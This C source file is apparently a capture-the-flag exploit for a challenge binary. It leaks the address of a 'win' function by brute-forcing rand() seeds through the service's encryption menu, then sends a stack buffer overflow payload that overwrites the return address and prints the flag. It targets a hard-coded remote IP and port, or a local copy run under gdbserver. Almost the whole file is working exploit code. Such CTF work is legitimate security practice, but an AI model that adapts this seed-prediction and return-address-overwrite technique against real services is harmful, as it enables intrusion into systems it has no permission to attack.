#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
#include <arpa/inet.h>




#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"


// #define DEBUG
#define NETW
// #define GDB

#define PORT 30040

// Find out win address
//	Execute do_seed until there should be guessable part of address
//	(in-child) Encrypt simple message or messages     (in-here) Try 256 different seeds and then encrypt the message
//	Continue with correctly guessable seed
// Owerwrite return address
//	Handle zero's cases (probably by emulating right strings, consequently call rand and etc...)

char* test = "ABCD";
bool filled[8] = {0};
char win_address[8] = {0};

int crecv(int sockfd, char *buf, size_t len, int flags) {
	int res;
#ifndef NETW
	res = read(sockfd, buf, len); //
#else
	res = recv(sockfd, buf, len, flags);
#endif

	buf[res] = '\0';

#ifdef DEBUG
	printf("--- Received: (%d) ----\n"ANSI_COLOR_RED"%s"ANSI_COLOR_RESET"\n ----\n\n", res, buf);
#endif //DEBUG
	return res;
}

int csend(int sockfd, const void *buf, size_t len, int flags) {
	int res;

#ifndef NETW
	res = write(sockfd, buf, len);
#else
	res = send(sockfd, buf, len, flags);
#endif

#ifdef DEBUG
	printf("--- Sent (%d): "ANSI_COLOR_GREEN"%s"ANSI_COLOR_RESET" ---\n\n", len, buf);
#endif //DEBUG
}

void encrypt(char* data, char key) {
	while (*data) {
		*data += key;
		data++;
	}
}

//// First Stage ////
int brute_rand_server(int *target) {
	// TODO
	int data;
	int other_data;
	int count = -1;

	do {
		count++;
		data = rand();
		other_data = data & 7;
		other_data = other_data << 3;
		*target = (int)other_data/8;
	// if 
	} while ((other_data < 16 && other_data > 64) || filled[*target]);

	printf("[+] Found number of rands: %u and target: %u and rand(): %d\n", count, *target, data);

	filled[*target] = 1;

	return count;
}

void send_encrypt(int fin, int fout, char* data, int len) {
	char buff[100] = {0};
	crecv(fin, buff, sizeof(buff), 0);
	csend(fout, "2\n", 2, 0);
	crecv(fin, buff, sizeof(buff), 0);
	csend(fout, data, len, 0);
}

void read_ciphertext(int fin, int fout, char* buf) {
	char tmp_buf[80] = {0};
	// Read menu
	crecv(fin, tmp_buf, sizeof(tmp_buf), 0);
	csend(fout, "3\n", 2, 0);
	// Read "ciphertext: <data>\x0a"
	crecv(fin, tmp_buf, 12, 0);
	crecv(fin, buf, 0x80, 0);
	crecv(fin, tmp_buf, 1, 0);
	// printf("Readed encrypted: %s -- %hx\n", buf, *(int*)buf);
}

void send_seed(int fin, int fout) {
	char tmp_buf[80] = {0};
	crecv(fin, tmp_buf, sizeof(tmp_buf), 0);
	csend(fout, "1\n", 2, 0);
}

void send_exit(int fin, int fout) {
	char tmp_buf[80] = {0};
	crecv(fin, tmp_buf, sizeof(tmp_buf), 0);
	csend(fout, "0\n", 2, 0);
}

void child_test_seed_client(int fin, int fout, char* message) {
	char buff[0x89] = {0};
	char small_buf[2] = {0};
	for (int i=0; i<4; i++) {
		small_buf[0] = test[i];
		send_encrypt(fin, fout, small_buf, 2);
		read_ciphertext(fin, fout, buff);
		message[i] = buff[0];
	}
}



// Messages to test encryption: "A", "B", "C", "D"
bool test_srand_server(char* message) {
	char small_buf[2] = {0};
	for (int i=0; i<4; i++) {
		small_buf[0] = test[i];
		encrypt(small_buf, rand());
		if (small_buf[0] != message[i])
			return false;
	}
	return true;
}

// Return target seed
char brute_seeds_server(char* message) {
	for (int i=0; i<256; i++) {
		srand(i);
		if (test_srand_server(message))
			return i;
	}
	printf("Unable to find proper seed!!!\n");
	exit(0);

}

char brute_seed(int fin, int fout) {
	char message[4] = {0};
	child_test_seed_client(fin, fout, message);
	return brute_seeds_server(message);
}

void brute_rand_client(int fin, int fout) {
	filled[0] = 1;
	filled[1] = 1;
	win_address[0] = 0xD6;
	win_address[1] = 0x0A;
	for (int i=0; i<6; i++) {
		int target = 0;
		int count = brute_rand_server(&target);
		for (int j=0; j<count; j++){
			// Dummy runs
			send_encrypt(fin, fout, "A", 2);
		}
		send_seed(fin, fout);
		char seed = brute_seed(fin, fout);
		printf("[+] Found seed: 0x%hhx\n", seed);
		win_address[target] = seed;
	}

	printf("[+] Found win_address: 0x%llx\n", *(unsigned long long*)win_address);
}

void owerwrite_addr(int fin, int fout) {
	// Payload: "A"*0x98 + <enc_addr>
	char payload[0xa1];
	memset(payload, 'A', sizeof(payload));

	char enc_key = rand();
	for (int i=0; i<8; i++) {
		payload[0x98+i] = win_address[i] - enc_key;
	}
	payload[0xa0] = '\0';

	send_encrypt(fin, fout, payload, sizeof(payload));

	printf("Trigerring payload....\n");
	send_exit(fin, fout);

	printf("Now read the flag....\n");
	char tmp_buf[80] = {0};
	crecv(fin, tmp_buf, sizeof(tmp_buf), 0);
	printf("Flag: %s\n", tmp_buf);

}

void execute_local(int argc, char* argv[], char* envp[]) {
	int fd_in[2];
	int fd_out[2];
	int fd_err[2];
	pipe(fd_in);
	pipe(fd_out);
	pipe(fd_err);

	int pid = fork();

	if (!pid) {
		close(fd_in[0]);
		close(fd_out[1]);
		close(fd_err[0]);

		dup2(fd_in[1], 1);
		dup2(fd_out[0], 0);
		dup2(fd_err[1], 2);
#ifdef GDB
		execl("/usr/bin/gdbserver", "gdbserver", "127.0.0.1:8080", "./challenge", (char*)NULL);
#else
		execve("./challenge", argv, envp);
#endif

		printf("Close fd in client...");

		close(fd_in[1]);
		close(fd_out[0]);
		close(fd_err[1]);
	} else {
		// Parent
		close(fd_in[1]);
		close(fd_out[0]);
		close(fd_err[1]);

		sleep(1);
		printf("Begin in parent.....\n");

#ifdef GDB
		// Receive gdbserver header
		// char buf[80];
		// crecv(fd_in[0], buf, sizeof(buf), 0);
		// printf("Gdbserver header: --- %s ---\n", buf);

		// Execute gdb in new window
		int gdb_pid = fork();
		if (!gdb_pid) {
			execl("/usr/bin/x-terminal-emulator", "x-terminal-emulator", "-e", "gdb -ex \"gef-remote 127.0.0.1:8080\"", (char  *) NULL);
			return 0;
		}
		printf("Waiting for gdb to attach....\n");
		int wstatus;
		waitpid(gdb_pid, &wstatus, WNOHANG);
		printf("Attached, continue execution\n");

#endif

		brute_rand_client(fd_in[0], fd_out[1]);
		owerwrite_addr(fd_in[0], fd_out[1]);

		close(fd_in[0]);
		close(fd_out[1]);
		close(fd_err[0]);

	}
}

int execute_netw() {
    int sock = 0, valread, client_fd;
    struct sockaddr_in serv_addr;
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }
  
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
  
    // Convert IPv4 and IPv6 addresses from text to binary
    // form
    if (inet_pton(AF_INET, "159.65.106.248", &serv_addr.sin_addr)
        <= 0) {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }
  
    if ((client_fd
         = connect(sock, (struct sockaddr*)&serv_addr,
                   sizeof(serv_addr)))
        < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    // send(sock, hello, strlen(hello), 0);
    // printf("Hello message sent\n");
    // valread = read(sock, buffer, 1024);
    // printf("%s\n", buffer);

    brute_rand_client(sock, sock);
	owerwrite_addr(sock, sock);
  
    // closing the connected socket
    close(client_fd);
    return 0;
}

int main(int argc, char* argv[], char* envp[]) {
#ifndef NETW
	execute_local(argc, argv, envp);
#else
	execute_netw();
#endif

	return 0;
}